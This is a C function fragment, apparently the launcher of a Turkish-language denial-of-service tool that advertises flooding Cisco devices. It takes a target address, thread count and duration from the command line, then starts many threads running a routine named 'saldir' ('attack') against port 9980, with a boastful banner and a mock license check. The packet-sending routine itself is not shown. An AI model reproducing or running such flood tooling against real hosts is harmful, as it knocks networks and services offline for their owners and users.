int bypasslakocum(int kontrol, char *durumcuuuk[ ])
{
        if(kontrol < 4){
        	    fprintf(stdout, "Cisco Flood Srx 3600 Paketi Kargo Gibi Adrese Teslim Eder :) ...\n");
                fprintf(stderr, "Rodriquez....\n", durumcuuuk[0]);
                exit(-1);
        }

    
 
 
        int i = 0;
        fprintf(stdout, "Lisans Kontrolu Dostum, Lisansiniz Yoksa İletisime Geciniz...\n");
        int max_paket = 128;
        char *veri = (char *) malloc(max_paket);
        veri = memset(veri, 0x00, max_paket);
        int islemcimiktari = atoi(durumcuuuk[3]);
        pthread_t cekirdek[islemcimiktari];
        struct cekirdek_verisi td[islemcimiktari];
		portumuz = 9980;
        for(i = 0;i<islemcimiktari;i++){
                pthread_create( &cekirdek[i], NULL, &saldir, (void *) durumcuuuk[1]);
        }
        fprintf(stdout, "İstanbul Sabiha Gökcen Havalimani İyi Uçuşlar Diler Adamimmm....\n");
        fprintf(stdout, "Rodriquez... \n");
        if(kontrol > 4)
        {
                sleep(atoi(durumcuuuk[4]));
        } else {
                while(1){
                        sleep(1);
                }
        }
        return 0;
}
